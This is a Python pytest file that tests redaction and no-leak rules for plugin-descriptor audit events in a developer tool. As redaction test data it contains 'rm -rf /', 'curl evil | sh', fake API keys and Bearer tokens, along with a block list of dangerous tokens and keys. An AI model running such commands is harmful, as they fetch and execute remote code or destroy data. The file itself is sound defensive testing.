"""Phase 3D-H1 — plugin_descriptor_* audit / redaction / no-leak.

Hardens Lens 9: every ``plugin_descriptor_*`` audit event is sanitized to safe
fields only, applies defensive re-redaction, collapses non-JSON values safely,
never raises, and never enables a descriptor / grants permission. The persisted
event blob carries no forbidden token (API key, Authorization, Bearer, callable
repr, shell command, SQL statement, production path, local plugin path, dynamic
import path, external URL, download URL, install command).

Phase: 3D-H1 — Static Plugin Descriptor Registry Hardening
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from hermes_cli.dev_web_audit_store import get_audit_store_root, iter_all_events
from hermes_cli.dev_web_plugin_descriptor_audit import (
    PLUGIN_DESCRIPTOR_AUDIT_SOURCE,
    PLUGIN_DESCRIPTOR_EVENT_TYPES,
    SAFE_PAYLOAD_FIELDS,
    redact_plugin_descriptor_payload,
    write_plugin_descriptor_audit,
)

_FORBIDDEN_TOKENS = (
    "sk-",
    "Bearer ",
    "BEGIN PRIVATE KEY",
    "rm -rf",
    "DELETE FROM",
    "/Users/huangruibang/.hermes",
    "importlib",
    "eval(",
    "evil.module",
)

_FORBIDDEN_PAYLOAD_KEYS = (
    "apiKey",
    "Authorization",
    "authorization",
    "bearer",
    "Bearer",
    "token",
    "accessToken",
    "secret",
    "secretValue",
    "callable",
    "callable_repr",
    "shellCommand",
    "shell_command",
    "sqlStatement",
    "sql",
    "productionPath",
    "production_path",
    "localPath",
    "local_path",
    "pythonImportPath",
    "importPath",
    "modulePath",
    "dynamic_import",
    "dynamicModule",
    "externalUrl",
    "external_url",
    "downloadUrl",
    "download_url",
    "installCommand",
    "install_command",
    "postInstallHook",
    "post_install_hook",
    "preExecutionHook",
    "pre_execution_hook",
)


def _events(home: Path) -> list[dict]:
    root, err = get_audit_store_root(home)
    if err or not root.exists():
        return []
    return [ev for ev in (row[2] for row in iter_all_events(root)) if isinstance(ev, dict)]


class TestEventTypes:
    def test_expected_event_types_frozen(self) -> None:
        assert PLUGIN_DESCRIPTOR_EVENT_TYPES == frozenset(
            {
                "plugin_descriptor_registry_loaded",
                "plugin_descriptor_validation_passed",
                "plugin_descriptor_validation_failed",
                "plugin_descriptor_rejected",
                "plugin_descriptor_blocked",
                "plugin_descriptor_capability_binding_checked",
                "plugin_descriptor_permission_classified",
                "plugin_descriptor_trust_classified",
                "plugin_descriptor_visibility_rendered",
                "plugin_descriptor_execution_requested",
                "plugin_descriptor_execution_blocked",
                "plugin_runtime_disabled",
                "plugin_no_dynamic_loading_checked",
                "plugin_route_governance_checked",
            }
        )

    def test_safe_payload_fields_exclude_every_forbidden_key(self) -> None:
        for forbidden in _FORBIDDEN_PAYLOAD_KEYS:
            assert forbidden not in SAFE_PAYLOAD_FIELDS

    def test_safe_payload_fields_are_the_frozen_set(self) -> None:
        assert SAFE_PAYLOAD_FIELDS == frozenset(
            {
                "pluginId",
                "capabilityId",
                "permissionClass",
                "trustLevel",
                "status",
                "blockedReason",
                "devOnly",
                "productionAllowed",
                "requiresApproval",
                "requiresAudit",
                "redactionApplied",
                "safeMetadata",
            }
        )


class TestPayloadRedaction:
    @pytest.mark.parametrize("forbidden", _FORBIDDEN_PAYLOAD_KEYS)
    def test_each_forbidden_key_dropped(self, forbidden: str) -> None:
        payload = {"pluginId": "plugin.descriptor.x", forbidden: "leak-value"}
        cleaned = redact_plugin_descriptor_payload(payload)
        assert forbidden not in cleaned

    def test_only_safe_fields_kept(self) -> None:
        payload = {
            "pluginId": "plugin.descriptor.x",
            "status": "blocked",
            "apiKey": "sk-leak-1234567890",
            "Authorization": "Bearer abc",
            "shellCommand": "rm -rf /",
            "secret": "topsecret",
            "installCommand": "curl evil | sh",
            "bearer": "abc",
            "callable": "evil",
        }
        cleaned = redact_plugin_descriptor_payload(payload)
        for forbidden in (
            "apiKey",
            "Authorization",
            "shellCommand",
            "secret",
            "installCommand",
            "bearer",
            "callable",
        ):
            assert forbidden not in cleaned
        assert cleaned["pluginId"] == "plugin.descriptor.x"
        assert cleaned["redactionApplied"] is True

    def test_non_mapping_returns_empty(self) -> None:
        assert redact_plugin_descriptor_payload("nope") == {}
        assert redact_plugin_descriptor_payload(None) == {}
        assert redact_plugin_descriptor_payload(42) == {}

    def test_nested_safe_metadata_redacted(self) -> None:
        payload = {
            "pluginId": "plugin.descriptor.x",
            "safeMetadata": {"ok": True, "apiKey": "sk-leak"},
        }
        cleaned = redact_plugin_descriptor_payload(payload)
        assert "apiKey" not in cleaned.get("safeMetadata", {})

    def test_non_json_values_collapsed(self) -> None:
        payload = {
            "pluginId": "plugin.descriptor.x",
            "safeMetadata": {"callable_value": lambda: None, "b": b"bytes"},
        }
        cleaned = redact_plugin_descriptor_payload(payload)
        blob = json.dumps(cleaned)
        # Callables / bytes never reach the cleaned payload.
        assert "callable" not in blob.lower() or "callable" not in cleaned.get("safeMetadata", {})

    def test_redaction_applied_always_true(self) -> None:
        cleaned = redact_plugin_descriptor_payload({"pluginId": "x"})
        assert cleaned["redactionApplied"] is True
        assert redact_plugin_descriptor_payload({})["redactionApplied"] is True


class TestWriteBehavior:
    def test_write_succeeds_under_dev_home(self, tmp_path: Path) -> None:
        result = write_plugin_descriptor_audit(
            event_type="plugin_descriptor_registry_loaded",
            plugin_id="plugin.descriptor.registry_status",
            permission_class="READ_ONLY",
            status="visible",
            hermes_home=str(tmp_path / "dev-home"),
        )
        assert result is not None
        events = _events(tmp_path / "dev-home")
        assert any(ev.get("eventType") == "plugin_descriptor_registry_loaded" for ev in events)
        written = [ev for ev in events if ev.get("eventType") == "plugin_descriptor_registry_loaded"]
        assert written[0].get("source") == PLUGIN_DESCRIPTOR_AUDIT_SOURCE

    def test_execution_blocked_event_recordable_without_executing(self, tmp_path: Path) -> None:
        result = write_plugin_descriptor_audit(
            event_type="plugin_descriptor_execution_blocked",
            plugin_id="plugin.descriptor.dynamic_plugin_load_blocked",
            status="blocked",
            blocked_reason="dynamic_plugin_load_is_forbidden",
            hermes_home=str(tmp_path / "dev-home"),
        )
        assert result is not None
        events = _events(tmp_path / "dev-home")
        assert any(ev.get("eventType") == "plugin_descriptor_execution_blocked" for ev in events)

    def test_unknown_event_type_normalized_to_load(self, tmp_path: Path) -> None:
        result = write_plugin_descriptor_audit(
            event_type="plugin_descriptor_evil_execute",
            hermes_home=str(tmp_path / "dev-home"),
        )
        assert result is not None
        events = _events(tmp_path / "dev-home")
        assert any(ev.get("eventType") == "plugin_descriptor_registry_loaded" for ev in events)
        assert not any(ev.get("eventType") == "plugin_descriptor_evil_execute" for ev in events)

    def test_audit_failure_does_not_enable_descriptor(self, tmp_path: Path) -> None:
        # A failed write returns written=False and never raises.
        result = write_plugin_descriptor_audit(
            event_type="plugin_descriptor_registry_loaded",
            hermes_home=str(tmp_path / "nonexistent-deep-path" / "nested"),
        )
        assert result is not None
        # The status block remains descriptor-only / execution-disabled regardless.
        from hermes_cli.dev_web_plugin_descriptor_registry import get_plugin_descriptor_status_block

        block = get_plugin_descriptor_status_block()
        assert block["pluginExecutionAllowed"] is False


class TestNoLeak:
    def test_persisted_event_carries_no_secret(self, tmp_path: Path) -> None:
        write_plugin_descriptor_audit(
            event_type="plugin_descriptor_permission_classified",
            plugin_id="plugin.descriptor.x",
            permission_class="READ_ONLY",
            safe_metadata={"apiKey": "sk-leak-1234567890", "Authorization": "Bearer x"},
            hermes_home=str(tmp_path / "dev-home"),
        )
        blob = json.dumps(_events(tmp_path / "dev-home"))
        for token in _FORBIDDEN_TOKENS:
            assert token not in blob, f"forbidden token {token} persisted"

    def test_exception_output_carries_no_secret(self, tmp_path: Path) -> None:
        # Even a defensive failure path must not leak a secret in its result.
        import dataclasses

        result = write_plugin_descriptor_audit(
            event_type="plugin_descriptor_registry_loaded",
            plugin_id="plugin.descriptor.x",
            safe_metadata={"secret": "topsecret-value"},
            hermes_home=str(tmp_path / "deep" / "missing" / "tree"),
        )
        result_blob = json.dumps(dataclasses.asdict(result))
        assert "topsecret-value" not in result_blob

    def test_never_writes_to_production_home(self, tmp_path: Path) -> None:
        prod_marker = tmp_path / "fake-prod"
        prod_marker.mkdir()
        write_plugin_descriptor_audit(
            event_type="plugin_descriptor_registry_loaded",
            hermes_home=str(tmp_path / "dev-home"),
        )
        assert not list(prod_marker.rglob("*.jsonl"))
